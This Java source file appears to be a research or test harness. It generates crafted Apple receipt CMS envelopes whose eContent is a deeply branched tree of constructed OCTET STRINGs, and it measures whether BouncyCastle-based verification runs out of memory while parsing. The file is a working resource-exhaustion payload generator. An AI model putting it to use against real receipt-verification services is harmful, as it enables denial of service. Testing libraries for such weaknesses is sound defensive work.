import io.github.emindeniz99.applepurchasereceiptverifier.Config;
import io.github.emindeniz99.applepurchasereceiptverifier.ReceiptPayload;
import io.github.emindeniz99.applepurchasereceiptverifier.TestPki;
import io.github.emindeniz99.applepurchasereceiptverifier.VerificationResult;
import io.github.emindeniz99.applepurchasereceiptverifier.Verifier;
import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.Instant;
import java.time.temporal.ChronoUnit;
import java.util.Base64;
import java.util.Collections;
import org.bouncycastle.asn1.ASN1Encodable;
import org.bouncycastle.asn1.ASN1Primitive;
import org.bouncycastle.asn1.cms.CMSObjectIdentifiers;
import org.bouncycastle.asn1.cms.ContentInfo;
import org.bouncycastle.asn1.cms.SignedData;

/**
 * What does a receipt cost the Java implementation when its eContent is a
 * branched tree of constructed OCTET STRINGs? BouncyCastle's BEROctetString
 * keeps a flattened copy of its content beside its children, so every
 * internal node of a branched tree holds a copy of its whole subtree, built
 * while the envelope is parsed and before any signer is matched.
 *
 * <pre>
 *   size ROOT LEVELS LEAF       print the DER and base64 length of the shape
 *   make FILE ROOT LEVELS LEAF  write the receipt's base64 to FILE; refuse it above the cap
 *   once FILE                   one verifyReceipt under Apple's roots; exit 3 on OutOfMemoryError
 * </pre>
 *
 * The tree is LEVELS constructed levels deep. Its root has ROOT children,
 * every other constructed node two, and the leaves are primitive OCTET
 * STRINGs of LEAF zero bytes, all definite-length. The rest of the
 * envelope (version, digestAlgorithms, certificates, SignerInfo) is a
 * TestPki receipt's, so the signature covers other content and nothing here
 * is signed; under Apple's roots the call ends at UNTRUSTED_CHAIN.
 */
public final class BranchedEContent {

    private static final int CAP = 3_145_728;

    public static void main(String[] args) throws Exception {
        switch (args[0]) {
            case "size": {
                byte[] der = receipt(Integer.parseInt(args[1]), Integer.parseInt(args[2]), Integer.parseInt(args[3]));
                System.out.printf("root %s, %s levels, leaf %s: %d DER bytes, %d base64 chars (cap %d)%n",
                        args[1], args[2], args[3], der.length, (der.length + 2) / 3 * 4, CAP);
                break;
            }
            case "make": {
                Path file = Paths.get(args[1]);
                byte[] der = receipt(Integer.parseInt(args[2]), Integer.parseInt(args[3]), Integer.parseInt(args[4]));
                String base64 = Base64.getEncoder().encodeToString(der);
                if (base64.length() > CAP) {
                    throw new IllegalStateException(file.getFileName() + " is over the cap: " + base64.length());
                }
                Files.write(file, base64.getBytes(StandardCharsets.US_ASCII));
                System.out.printf("%s: %d DER bytes, %d base64 chars (cap %d)%n",
                        file.getFileName(), der.length, base64.length(), CAP);
                break;
            }
            case "once": {
                String base64 = new String(Files.readAllBytes(Paths.get(args[1])), StandardCharsets.US_ASCII);
                Verifier verifier = Verifier.create(Config.defaults());
                try {
                    VerificationResult<ReceiptPayload> result = verifier.verifyReceipt(base64);
                    System.out.println("verdict: " + (result.verified() ? "VERIFIED" : result.failure().reason()));
                } catch (OutOfMemoryError e) {
                    System.out.println("OutOfMemoryError");
                    System.exit(3);
                }
                break;
            }
            default:
                throw new IllegalArgumentException(args[0]);
        }
    }

    private static byte[] receipt(int rootChildren, int levels, int leaf) throws Exception {
        TestPki pki = TestPki.receipt();
        String now = Instant.now().truncatedTo(ChronoUnit.SECONDS).toString();
        byte[] signed = pki.signReceipt(TestPki.receiptPayload(
                "com.example.app", "1.0", new byte[] {1, 2, 3, 4}, new byte[] {5, 6, 7, 8}, now,
                Collections.<byte[]>emptyList()));
        SignedData sd = SignedData.getInstance(
                ContentInfo.getInstance(ASN1Primitive.fromByteArray(signed)).getContent());
        byte[] tree = node(levels, rootChildren, leaf);
        byte[] encapContentInfo = tlv(0x30, cat(CMSObjectIdentifiers.data.getEncoded(), tlv(0xA0, tree)));
        ByteArrayOutputStream certificates = new ByteArrayOutputStream();
        for (ASN1Encodable certificate : sd.getCertificates()) {
            certificates.write(certificate.toASN1Primitive().getEncoded("DER"));
        }
        byte[] signedData = tlv(0x30, cat(
                sd.getVersion().getEncoded(),
                sd.getDigestAlgorithms().getEncoded("DER"),
                encapContentInfo,
                tlv(0xA0, certificates.toByteArray()),
                sd.getSignerInfos().getEncoded("DER")));
        return tlv(0x30, cat(CMSObjectIdentifiers.signedData.getEncoded(), tlv(0xA0, signedData)));
    }

    /** {@code levels} constructed levels; this node has {@code children}, every one below it two. */
    private static byte[] node(int levels, int children, int leaf) {
        if (levels == 0) {
            return tlv(0x04, new byte[leaf]);
        }
        byte[] child = node(levels - 1, 2, leaf);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        for (int i = 0; i < children; i++) {
            out.write(child, 0, child.length);
        }
        return tlv(0x24, out.toByteArray());
    }

    private static byte[] cat(byte[]... parts) {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        for (byte[] part : parts) {
            out.write(part, 0, part.length);
        }
        return out.toByteArray();
    }

    /** A TLV with a minimal definite length. */
    private static byte[] tlv(int tag, byte[] content) {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        out.write(tag);
        int n = content.length;
        if (n < 0x80) {
            out.write(n);
        } else {
            int bytes = n < 0x100 ? 1 : n < 0x10000 ? 2 : n < 0x1000000 ? 3 : 4;
            out.write(0x80 | bytes);
            for (int i = bytes - 1; i >= 0; i--) {
                out.write((n >> (8 * i)) & 0xff);
            }
        }
        out.write(content, 0, content.length);
        return out.toByteArray();
    }
}
